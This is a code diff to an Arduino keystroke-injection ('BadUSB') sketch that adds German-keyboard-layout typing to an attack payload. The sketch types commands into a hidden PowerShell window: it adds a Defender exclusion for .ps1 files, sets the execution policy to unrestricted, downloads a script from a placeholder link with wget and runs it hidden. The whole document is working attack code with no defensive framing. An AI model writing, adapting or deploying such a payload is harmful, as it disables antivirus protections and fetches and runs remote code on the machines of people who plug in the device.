@@ -7,6 +7,65 @@ void typeKey(int key){
   Keyboard.release(key);
 }
 
+// Function to type strings with German layout
+void typeStringDE(String s) {
+  for (int i = 0; i < s.length(); i++) {
+    char c = s.charAt(i);
+    if (c >= 'a' && c <= 'z') {
+      Keyboard.press(c);
+      Keyboard.release(c);
+    } else if (c >= 'A' && c <= 'Z') {
+      Keyboard.press(KEY_LEFT_SHIFT);
+      Keyboard.press(tolower(c));
+      Keyboard.releaseAll();
+    } else if (c >= '0' && c <= '9') {
+      Keyboard.press(c);
+      Keyboard.release(c);
+    } else {
+      switch (c) {
+        case ' ':
+          Keyboard.press(' ');
+          Keyboard.release(' ');
+          break;
+        case '-':
+          Keyboard.press(KEY_MINUS);
+          Keyboard.release(KEY_MINUS);
+          break;
+        case '.':
+          Keyboard.press('.');
+          Keyboard.release('.');
+          break;
+        case ':':
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.press('.');
+          Keyboard.releaseAll();
+          break;
+        case '/':
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.press('7');
+          Keyboard.releaseAll();
+          break;
+        case '|':
+          Keyboard.press(KEY_RIGHT_ALT);
+          Keyboard.press(KEY_NON_US_100);  // Assuming KEY_NON_US_100 is < > | in German
+          Keyboard.releaseAll();
+          break;
+        case '"':
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.press('2');
+          Keyboard.releaseAll();
+          break;
+        default:
+          // For other chars, assume direct
+          Keyboard.press(c);
+          Keyboard.release(c);
+          break;
+      }
+    }
+    delay(10);  // Small delay between chars
+  }
+}
+
 void setup()
 {
   // Start Keyboard and Mouse
@@ -31,7 +90,7 @@ void setup()
 
   delay(500);
 
-  Keyboard.print("powershell.exe -windowstyle hidden");
+  typeStringDE("powershell.exe -windowstyle hidden");
 
   delay(200);
 
@@ -53,46 +112,46 @@ void setup()
 
   //Go to Public Documents directory
 
-  Keyboard.print("cd C:");
+  typeStringDE("cd C:");
 
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(173);
   Keyboard.releaseAll();
 
-  Keyboard.print("Users");
+  typeStringDE("Users");
 
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(173);
   Keyboard.releaseAll();
 
-  Keyboard.print("Public");
+  typeStringDE("Public");
 
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(173);
   Keyboard.releaseAll();
 
-  Keyboard.print("Documents");
+  typeStringDE("Documents");
 
   typeKey(KEY_RETURN);
 
   //Add an exception for .ps1 files in antivirus
 
-  Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");
+  typeStringDE("Add-MpPreference -ExclusionExtension ps1 -Force");
 
   typeKey(KEY_RETURN);
 
   //Disable script blocker
 
-  Keyboard.print("Set-ExecutionPolicy unrestricted -Force");
+  typeStringDE("Set-ExecutionPolicy unrestricted -Force");
 
   typeKey(KEY_RETURN);
 
   //Download ps1 sript
 
-  Keyboard.print("wget LINK -OutFile startScript.ps1");
+  typeStringDE("wget LINK -OutFile startScript.ps1");
 
   typeKey(KEY_RETURN);
 
@@ -100,7 +159,7 @@ void setup()
 
   //Start ps1 script
 
-  Keyboard.print("powershell.exe -noexit -windowstyle hidden -file startScript.ps1");
+  typeStringDE("powershell.exe -noexit -windowstyle hidden -file startScript.ps1");
 
   typeKey(KEY_RETURN);
 
